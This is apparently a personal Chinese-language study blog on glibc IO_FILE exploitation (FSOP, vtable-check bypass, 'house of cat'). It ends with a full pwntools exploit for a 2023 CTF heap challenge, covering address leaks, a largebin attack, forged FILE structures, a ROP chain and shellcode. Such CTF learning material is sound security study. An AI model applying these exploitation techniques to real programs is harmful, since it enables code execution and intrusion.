## FEB week 3

学学 io_file。从[结构体和部分利用手法](https://ywhkkx.github.io/2022/03/16/IO_FILE%20pwn/)看起，随后粗粗调了一下[io相关函数](https://zikh26.github.io/categories/%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95-%E5%88%86%E6%9E%90/)，就去看[house of cat](https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_3)。和 malloc.c 的源码比起来 io 的函数清晰不少，感觉把指针的关系理清楚是关键。

> FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流
>
> FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中，然后以链表的形式串联起来。比较特殊的是，系统一开始会自动创建的三个文件即 stdin、stdout、stderr，它们是在libc上。

### 结构体

#### gdb 查看结构体

遇到的第一个问题就是如何查看结构体。

- `ptype/xo _IO_list_all.file` ，查看结构体成员偏移（/o）的并用十六进制打印（/x）：

  ![image-20230218232326360](https://s2.loli.net/2023/02/18/GFuBOSgrYVf47I9.png) 

  这样在伪造结构体的时候比较方便：

  ![image-20230219124905305](https://s2.loli.net/2023/02/19/3KdVL8OTplFrawS.png) 

- `p/x*(struct _IO_FILE_plus*)_IO_list_all`，加上结构体类型（struct）可以详细显示成员信息

	![image-20230218233612085](https://s2.loli.net/2023/02/18/qjpYd68KBW3iear.png) 

- `p _IO_list_all.file._chain._chain` 打印成员

  ![image-20230218234028736](https://s2.loli.net/2023/02/18/RhfEZ1LiwzdlMFu.png) 

#### _IO_FILE_plus

![image-20230219103639170](https://s2.loli.net/2023/02/19/WoOrkzVBK8e4nXA.png) 

`_IO_FILE_plus` 是每个 file 的基本结构，包括 stdin、打开的文件等，下面演示了 stdin 的结构体内容。第二个成员 `vtable` 在每个 _IO_FILE_plus 中指向一样的地址。变量 _IO_list_all 指向了最后一个打开的 file 的结构体，如果是初始的情况则指向 stderr，若有其他 file 打开就会指向那个最新的 file。

![image-20230219103730437](https://s2.loli.net/2023/02/19/fTjeCQkcY3aAX52.png) 

#### FILE

`_IO_FILE_plus` 的第一个成员。具体下文看注释。

```bash
pwndbg> ptype /ox _IO_list_all.file
type = struct _IO_FILE {
/* 0x0000      |  0x0004 */    int _flags;                     #标记，在libio.h中定义
/* XXX  4-byte hole      */
/* 0x0008      |  0x0008 */    char *_IO_read_ptr;             #目前输入指向
/* 0x0010      |  0x0008 */    char *_IO_read_end;             #输入缓冲区结束
/* 0x0018      |  0x0008 */    char *_IO_read_base;            #输入缓冲区开始
/* 0x0020      |  0x0008 */    char *_IO_write_base;
/* 0x0028      |  0x0008 */    char *_IO_write_ptr;
/* 0x0030      |  0x0008 */    char *_IO_write_end;
/* 0x0038      |  0x0008 */    char *_IO_buf_base;             #reserve area始末
/* 0x0040      |  0x0008 */    char *_IO_buf_end;
/* 0x0048      |  0x0008 */    char *_IO_save_base;
/* 0x0050      |  0x0008 */    char *_IO_backup_base;
/* 0x0058      |  0x0008 */    char *_IO_save_end;
/* 0x0060      |  0x0008 */    struct _IO_marker *_markers;
/* 0x0068      |  0x0008 */    struct _IO_FILE *_chain;        #链表的下一个
/* 0x0070      |  0x0004 */    int _fileno;                    #序号
/* 0x0074      |  0x0004 */    int _flags2;
/* 0x0078      |  0x0008 */    __off_t _old_offset;
/* 0x0080      |  0x0002 */    unsigned short _cur_column;
/* 0x0082      |  0x0001 */    signed char _vtable_offset;
/* 0x0083      |  0x0001 */    char _shortbuf[1];
/* XXX  4-byte hole      */
/* 0x0088      |  0x0008 */    _IO_lock_t *_lock;
/* 0x0090      |  0x0008 */    __off64_t _offset;
/* 0x0098      |  0x0008 */    struct _IO_codecvt *_codecvt;
/* 0x00a0      |  0x0008 */    struct _IO_wide_data *_wide_data;  # wide_data
/* 0x00a8      |  0x0008 */    struct _IO_FILE *_freeres_list;
/* 0x00b0      |  0x0008 */    void *_freeres_buf;
/* 0x00b8      |  0x0008 */    size_t __pad5;
/* 0x00c0      |  0x0004 */    int _mode;
/* 0x00c4      |  0x0014 */    char _unused2[20];

                               /* total size (bytes):  216 */
                             }             
```

#### _IO_jump_t

函数查找表，在这个表格中检索并跳转。`libc.sym._IO_wfile_jumps`。

![image-20230219103810938](https://s2.loli.net/2023/02/19/eYQSq3BmkXhrJOV.png) 

#### _wide_data

看源码注释，用途是 `Extra data for wide character streams`。

![image-20230219103917271](https://s2.loli.net/2023/02/19/Wgz7QVvnotsPAul.png) 

### house of cat 流程

这里主要记录一下自己的理解，细节不仔细分析了，侧重点是后面如何构造结构体绕过检测。

#### FSOP

全称 `File Stream Oriented Programming` 。由于 io_file 结构是由多个 `_IO_FILE_plus` 结构体串联而成，而变量 `IO_list_all` 指向了链开始的 `_IO_FILE_plus` ，因此篡改 `IO_list_all` 的值就能够伪造 file 链。FSOP 的大致思路是，更改 `IO_list_all` 指向伪造的 `_IO_FILE_plus`，构造 fake FILE 结构满足特定条件，同时构造 fake vtable 跳转到特定函数（libc < 2.24），如 system。这一过程由 `_IO_flush_all_lockp` 触发，这个函数用于刷新缓冲区。

 `_IO_flush_all_lockp` ->(伪造 io_file 满足条件) `_IO_OVERFLOW` -> `fake_overflow`(伪造的vtable中)

#### vtable 检测

libc < 2.24 之后增加了 vtable check，无法在任意地址构造 vtable，但是可以将 vtable 更改为距离原始 vtable 一定偏移的的地址，调用距离本应调用函数一定偏移的其他 vtable 表里的函数。

#### house of cat 的一种方式

 `_IO_flush_all_lockp` ->(伪造 io_file 满足条件) `_IO_OVERFLOW` -> `IO_wfile_seekoff`(偏移的vtable中) 

-> `_IO_switch_to wget_mode` -> call [[wide_data + 0xe0] + 0x18]

### 函数&绕过检测

#### 调试的小方法

- 把 libio 放在调试的文件所在路径就能看 source code

  ![image-20230219114611106](https://s2.loli.net/2023/02/19/1WJtcpKHCZxUfIP.png) 

- clion 的 bookmarks

  ![image-20230219113241344](https://s2.loli.net/2023/02/19/JIfog83aq2SL5yz.png) 

#### _IO_flush_all_lockp

用于刷新缓冲区，如果缓冲区有未输出的值就输出一下。

![image-20230219120911745](https://s2.loli.net/2023/02/19/4VaUEoRDMmefQ9L.png) 

#### IO_validate_vtable

检查 vtable 是否合理，构造 `fake_vtable = libc_base + libc.sym._IO_wfile_jumps + 0x30` 依然可以满足检测。这样一来本应调用 `_IO_OVERFLOW` 就会变成调用 `_IO_wfile_seekoff`。

![image-20230219121218197](https://s2.loli.net/2023/02/19/dnXf5OsWYTbL4Qy.png) 

 为绕过上面的检查需要构造：

```python
fake_io_file = heap_base + 0xcf0
fake_vtable = libc_base + libc.sym._IO_wfile_jumps + 0x30
fake_wide_data = fake_io_file + 0x100
payload = flat(
    {
        # 减0x10 是减去了 malloc_pointer 和 user data pointer之间的0x10
        0x28-0x10:1, # write_ptr   
        0xa0-0x10:fake_wide_data,
        0xd8-0x10:fake_vtable,
    },
    filler = '\x00'
)
payload = payload.ljust(0xf0, b'\x00') #为了后续不用在减 0x10，这里填充 0xf0
```

#### _IO_wfile_seekoff

没想懂这是干什么的。

![](https://s2.loli.net/2023/02/19/CrN6DLSAtavgFb9.png) 

#### _IO_switch_to_wget_mode

第一行 rdi 指向 fake_io_file，rax 赋值为 fake_wide_data。

![image-20230219122649934](https://s2.loli.net/2023/02/19/D9hA1rjE68fuVTG.png) 

#### setcontext

（乱入。主要是题目 ban 了 execve 所以就写了栈迁移。

![image-20230220073507177](https://s2.loli.net/2023/02/20/kiO4msVxTCYtfe6.png) 

  需要构造：

```python
#wide_data
payload += flat(
    {
        0x20:fake_wide_data, # rdx & write_ptr
        0x28:libc_base + libc.sym['setcontext'] + 61,
        0xe0:fake_wide_data+0x10,
        0xa0:rop_chain,  #rsp
        0xa8:rdi_ret

    },
    filler = '\x00'
)
payload = payload.ljust(0x1f0, b'\x00')

#rop_chain
#mprotect(heapbase, 0x100, 7)
payload += flat(
    {
        heap_base,
        rsi_ret,
        0x100,
        rdx_rbx_ret,
        0,
        7,
        libc_base + libc.sym['mprotect'],
        heap_base + 0xf30
    }
)

#sc
payload += asm(shellcraft.open('./flag'))
payload += asm(shellcraft.read(3, heap_base + 0xfe0, 20))
payload += asm(shellcraft.write(1, heap_base + 0xfe0, 20))
```

### hgame_2023_without_hook

丢一下完整的 exp

- exp

  ```python
  from pwn import *
  
  context(os='linux',arch='amd64',log_level='debug')
  content = 1
  
  if content == 1:
      context.terminal = ['tmux','splitw','-h']
      p = process("vuln")
      # gdb.attach(p, 'b _IO_flush_all_lockp')
      # p = gdb.debug('./vuln')
      pause()
  
  else:
      p = remote("week-1.hgame.lwsec.cn", 32610)
  
  def add(index, size):
      # 0x4ff 0x900
      p.sendlineafter(b'>', b'1')
      p.sendlineafter(b'Index: ', str(index).encode())
      p.sendlineafter(b'Size: ', str(size).encode())
  
  def delete(index):
      p.sendlineafter(b'>', b'2')
      p.sendlineafter(b'Index: ', str(index).encode())
  
  def edit(index, cont):
      p.sendlineafter(b'>', b'3')
      p.sendlineafter(b'Index: ', str(index).encode())
      p.sendafter(b'Content: ', cont)
  
  def show(index):
      p.sendlineafter(b'>', b'4')
      p.sendlineafter(b'Index: ', str(index).encode())
  
  
  
  def main():
      libc = ELF('./libc.so.6')
  
      #  leak libc base
      add(0, 0x540)
      add(1, 0x500)
      add(2, 0x530)
      add(3, 0x500)
      delete(0) # unsorted bin
      show(0)
      system_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))-0x1a88c0
      libc_base = system_addr - libc.sym['system']
      print('libc_base>>> '+hex(libc_base))
  
      # leak heap_base
      add(4, 0x600)
      edit(0, b'a'*0x10)
      show(0)
      heap_base = u64(p.recvuntil(b'\x0a')[-7:-1].ljust(8, b'\x00')) - 0x290
      print('heap_base>>> ' + hex(heap_base))
  
      # largebin_attack
      target = libc_base + libc.sym['_IO_list_all']
      payload = p64(libc_base +  0x1f6c60 + 0x4a0)*2 + p64(target - 0x20) * 2
      edit(0, payload)
      delete(2)
      add(5, 0x600)
  
      #set fake io_file
  
      fake_io_file = heap_base + 0xcf0
      fake_vtable = libc_base + libc.sym._IO_wfile_jumps + 0x30
      fake_wide_data = fake_io_file + 0x100
      rop_chain = fake_wide_data + 0x100
      rdi_ret = libc_base + 0x23ba5
      rsi_ret = libc_base + 0x251fe
      rdx_rbx_ret = libc_base + 0x8bbb9
  
      #io_file
      # vtable += 0x30;
      # fp->_wide_data->_IO_write_base == fp->_wide_data->_IO_write_ptr
      # _IO_in_put_mode (fp) != 0
      payload = flat(
          {
              0x28-0x10:1, # write_ptr
              0xa0-0x10:fake_wide_data,
              0xd8-0x10:fake_vtable,
          },
          filler = '\x00'
      )
      payload = payload.ljust(0xf0, b'\x00')
  
      #wide_data
      payload += flat(
          {
              0x20:fake_wide_data, # rdx & write_ptr
              0x28:libc_base + libc.sym['setcontext'] + 61,
              0xe0:fake_wide_data+0x10,
              0xa0:rop_chain,  #rsp
              0xa8:rdi_ret
  
          },
          filler = '\x00'
      )
      payload = payload.ljust(0x1f0, b'\x00')
  
      #rop_chain
      # mprotect(heapbase, 0x100, 7)
      payload += flat(
          {
              heap_base,
              rsi_ret,
              0x100,
              rdx_rbx_ret,
              0,
              7,
              libc_base + libc.sym['mprotect'],
              heap_base + 0xf30
          }
      )
  
      #sc
      payload += asm(shellcraft.open('./flag'))
      payload += asm(shellcraft.read(3, heap_base + 0xfe0, 20))
      payload += asm(shellcraft.write(1, heap_base + 0xfe0, 20))
  
      edit(2, payload)
      p.sendlineafter(b'>', b'5')
      p.interactive()
  main()
  
  ```


### 碎碎念

发现越写越水哈哈哈，主要是到饭点了，懒得打字，恰饭去咯！
